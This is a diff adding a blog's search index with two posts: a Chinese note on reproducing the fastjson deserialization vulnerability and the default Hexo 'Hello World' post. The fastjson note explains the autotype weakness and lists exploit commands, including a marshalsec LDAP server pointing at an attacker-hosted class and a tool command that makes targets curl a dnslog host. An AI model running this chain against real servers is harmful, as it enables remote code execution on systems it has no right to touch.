@@ -1,0 +1,39 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  
+  
+  
+  <entry>
+    <title>fastjson漏洞复现</title>
+    <link href="/2023/04/11/fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    <url>/2023/04/11/fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    
+    <content type="html"><![CDATA[<h2 id="fastjson简介"><a href="#fastjson简介" class="headerlink" title="fastjson简介"></a>fastjson简介</h2><p> fastjson作用：是一个非常流行的库，可以将数据在json和java object之间互相转换</p><p> 判断漏洞存在：</p><p> 低版本看到json传输就去尝试 </p><p> 报错：com.alibaba.fastjson.JSON </p><p> auto  type ：在序列化时不找错类型 </p><h2 id="fastjson反序列化"><a href="#fastjson反序列化" class="headerlink" title="fastjson反序列化"></a>fastjson反序列化</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>1.2.24之前：json拿到数据就转发，会导致加载@type中的恶意类</p><p>中间版本关闭了@type，使用checkautotype，对其中的类进行黑白名单LLL;;;的过滤</p><p>1.2.47autotype默认关闭，但是加载正常的类会执行payload中下面的类跟属性</p><h3 id="漏洞利用流程"><a href="#漏洞利用流程" class="headerlink" title="漏洞利用流程"></a>漏洞利用流程</h3><p>使用工具部署LDAP服务，开启端口 </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -cp marshalsec-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar marshalsec.jndi.LDAPRefServer http://IP:port/#Exploit <span class="hljs-number">9999</span> Listening <span class="hljs-literal">on</span> <span class="hljs-number">0.0.0.0:9999</span> <br></code></pre></td></tr></table></figure><p>再使用</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-cp fastjson_tool.<span class="hljs-keyword">jar </span>fastjson.HLDAPServer <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">188</span>.<span class="hljs-number">22</span>:<span class="hljs-number">80</span> <span class="hljs-string">&quot;curl ol0kll.dnslog.cn&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>漏洞复现</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Hello World</title>
+    <link href="/2023/04/11/hello-world/"/>
+    <url>/2023/04/11/hello-world/</url>
+    
+    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  
+</search>
